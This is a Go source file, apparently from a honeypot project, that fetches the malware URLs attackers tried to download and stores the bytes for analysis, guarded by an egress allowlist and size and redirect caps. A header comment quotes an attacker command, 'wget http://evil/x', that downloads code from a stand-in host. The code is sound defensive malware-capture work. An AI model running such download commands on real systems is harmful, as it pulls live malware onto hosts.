// Package fetcher actively retrieves an ingress-tool-transfer URL that an
// attacker tried to pull (a "wget http://evil/x" typed into the emulated shell,
// or a harvested dropper URL) and returns the downloaded bytes as a
// payload.Artifact for the sample store. This turns a recorded intent ("the
// attacker tried to download X") into the actual captured malware — the
// headline capability of high-interaction honeypots like Cowrie/Dionaea.
//
// It is OPT-IN and defends against being turned into an SSRF / exfil / DoS
// primitive:
//
//   - Every dial goes through the egress allowlist (egress.Policy.DialContext),
//     so the sensor can only fetch destinations the operator explicitly
//     permitted — a fetch to an arbitrary attacker URL is refused unless that
//     host/CIDR is allowlisted. (Operators who want broad capture allowlist a
//     dedicated analysis egress.)
//   - The download is hard-capped (MaxBytes) so a huge or endless response
//     can't exhaust memory/disk.
//   - Redirects are capped and re-checked against the allowlist.
//   - Only http/https schemes; a short per-fetch timeout bounds the work.
package fetcher

import (
	"context"
	"crypto/sha256"
	"encoding/hex"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"time"

	"github.com/rom/tarpit-honeypot/internal/egress"
	"github.com/rom/tarpit-honeypot/internal/payload"
)

// DefaultMaxBytes caps a single fetched artifact (16 MiB is generous for a
// dropper while bounding memory/disk).
const DefaultMaxBytes = 16 << 20

// Fetcher retrieves URLs through the egress allowlist into payload.Artifacts.
type Fetcher struct {
	client   *http.Client
	maxBytes int64
}

// New builds a Fetcher whose HTTP client dials through the given egress policy
// (use egress.Default()). A nil policy yields a Fetcher that refuses every
// fetch (fail-closed). timeout/maxBytes default when zero.
func New(pol *egress.Policy, timeout time.Duration, maxBytes int64) *Fetcher {
	if timeout <= 0 {
		timeout = 20 * time.Second
	}
	if maxBytes <= 0 {
		maxBytes = DefaultMaxBytes
	}
	f := &Fetcher{maxBytes: maxBytes}
	if pol != nil {
		c := pol.HTTPClient(timeout)
		// Cap redirects and re-validate each hop against the allowlist (the
		// transport's DialContext already enforces it, but bound the chain).
		c.CheckRedirect = func(req *http.Request, via []*http.Request) error {
			if len(via) >= 5 {
				return fmt.Errorf("stopped after 5 redirects")
			}
			return nil
		}
		f.client = c
	}
	return f
}

// Fetch retrieves rawURL and classifies the body into a payload.Artifact.
// Returns ok=false (and no error) when the fetcher is disabled, the URL isn't
// http(s), the destination is egress-denied, or nothing fetchable came back.
func (f *Fetcher) Fetch(ctx context.Context, rawURL string) (payload.Artifact, bool) {
	if f == nil || f.client == nil {
		return payload.Artifact{}, false
	}
	u, err := url.Parse(rawURL)
	if err != nil || (u.Scheme != "http" && u.Scheme != "https") || u.Host == "" {
		return payload.Artifact{}, false
	}
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, rawURL, nil)
	if err != nil {
		return payload.Artifact{}, false
	}
	// A neutral UA — we are pretending to be the victim that the attacker told
	// to fetch the file, so don't advertise the honeypot.
	req.Header.Set("User-Agent", "Wget/1.21.3")
	resp, err := f.client.Do(req)
	if err != nil {
		return payload.Artifact{}, false
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		return payload.Artifact{}, false
	}
	body, err := io.ReadAll(io.LimitReader(resp.Body, f.maxBytes))
	if err != nil || len(body) == 0 {
		return payload.Artifact{}, false
	}
	// Classify the downloaded bytes the same way pushed artifacts are.
	fnd := payload.Scan(body, true)
	for i := range fnd.Artifacts {
		// Prefer the executable/script/shellcode artifact the classifier found.
		return fnd.Artifacts[i], true
	}
	// Not a recognized executable class — still capture it as a raw download so
	// the operator has the bytes (hash + size), classified generic.
	sum := sha256.Sum256(body)
	return payload.Artifact{
		Kind:   "download",
		SHA256: hex.EncodeToString(sum[:]),
		Size:   len(body),
		Detail: "fetched " + rawURL,
		Bytes:  body,
	}, true
}
